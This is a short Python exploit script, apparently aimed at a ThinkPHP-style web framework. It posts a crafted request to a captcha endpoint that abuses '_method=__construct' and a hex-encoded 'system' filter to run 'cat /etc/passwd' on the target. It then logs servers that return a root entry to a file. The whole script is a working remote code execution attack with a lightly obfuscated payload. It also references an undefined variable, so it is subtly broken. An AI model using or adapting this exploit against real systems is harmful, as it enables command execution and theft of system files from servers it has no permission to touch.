import requests,re

url1="http://192.168.0.68:8001/index.php?s=captcha"


headers = {'Content-Type': 'application/x-www-form-urlencoded'}

data={"_method":"__construct","filter[]":"\x73\x79\x73\x74\x65\x6d","server[REQUEST_METHOD]":"cat%20/etc/passwd"}

aa=requests.post(url1,headers=headers,data=data,verify=False).text


if "root:*:0:0" in str(aa):
        print ("yes",url)
        with open("ok.txt",'a+') as file: file.write(aa+'\n') 
else:
        pass
